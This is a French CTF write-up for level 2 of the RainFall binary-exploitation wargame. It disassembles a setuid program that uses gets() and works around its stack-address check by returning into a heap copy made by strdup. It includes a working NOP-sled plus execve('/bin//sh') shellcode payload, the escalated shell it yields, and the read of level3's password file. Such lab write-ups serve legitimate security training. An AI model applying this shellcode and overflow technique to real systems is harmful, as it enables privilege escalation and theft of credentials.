# Level2
```
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
level2@RainFall:~$ ./level2
coucou
coucou
````
executable présent dans le repertoire qui ecris sur la sortie standart le prompt ouvert a l'execution. Passons le programme a gdb.
```
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

La fonction p declarée dans le main possède la logique.
On voit qu'il y a une fonction gets, non sécurisée car un tableau de 76 char est alloué.

```
void p(void)

{
  uint unaff_retaddr;
  char local_50 [76];

  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

L'étude du retro-ingieniering dans ghidra nous informe d'une condition apres le gets. Cette condition compare le bit de poids fort de l'adresse de retour de la fonction gets, si l'adresse commence par "0xb" le programme s'arrete.
Nous ne pouvons donc pas reutiliser la methode utilisée au niveau inferieur car le buffer situé sur la stack aura son addresse qui commence par "0xb".

```
Breakpoint 2 at 0x80484f2
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x080484f2 in p ()
(gdb) x/100x $esp
0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6d0:	0x080482b5	0xbffff7d4	0xbffff8fc	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
```

On constate que si on ne fais pas de buffer overflow, le programme passe au puts et strdup. Car l'adresse de retour de la fonction n'est pas écrasée
("0x08048550")

Nous voyons que le tableau est alloué sur le tas avec strdup.

L'exploit va consister a faire executer notre shellcode sur le tas au lieu de la stack.
Grace a un breakpoint apres strdup nous trouvons une addresse ou nous pourrons rediriger le shellcode.

```
(gdb) x/100x $eax-100
0x8049fa4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049fb4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049fc4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049fd4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049fe4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049ff4:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a004:	0x00000051	0x41414141	0x41414141	0x41414141
0x804a014:	0x41414141	0x41414141	0x41414141	0x41414141
```

```
level2@RainFall:~$ python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A"*(79-40-23) + "\x14\xa0\x04\x08"' > /tmp/payload
level2@RainFall:~$ cat /tmp/payload - | /home/user/level2/level2
????????????????????????????????????????1?Ph//shh/bin??1ɉ?j
                                                           X̀AAAAAAAAAAAA?
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```